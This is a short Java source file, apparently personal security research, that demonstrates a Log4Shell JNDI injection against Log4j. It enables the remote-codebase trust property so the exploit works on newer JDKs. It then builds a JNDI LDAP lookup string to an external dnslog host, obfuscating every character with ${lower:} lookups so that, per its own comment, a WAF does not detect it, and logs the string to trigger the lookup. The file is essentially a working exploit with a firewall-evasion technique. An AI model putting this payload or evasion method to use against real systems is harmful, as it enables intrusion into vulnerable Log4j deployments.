package com.pinger.javasec.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author : p1n93r
 * @date : 2021/12/13 11:25
 */
public class Basic {

    public static void bypassOne()throws Exception{




    }


    private static final Logger logger = LogManager.getLogger(Basic.class);

    public static void main(String[] args) {
        //高版本的jdk默认trustURLCodebase为false，因此不能成功利用JNDI注入
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");

        String dnslog = "515a37c9.dns.1433.eu.org";

        // 将dnslog处理一下，防止被waf识别为dnslog
        String[] hostSplit = dnslog.split("");
        StringBuilder newDnslog = new StringBuilder();
        for (String item : hostSplit) {
            newDnslog.append("${lower:%s}".replace("%s", item));
        }
        dnslog = newDnslog.toString();
        String vulnurl = "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://" + "p1n93r." + dnslog + "/}";
        logger.error(vulnurl);
    }

}
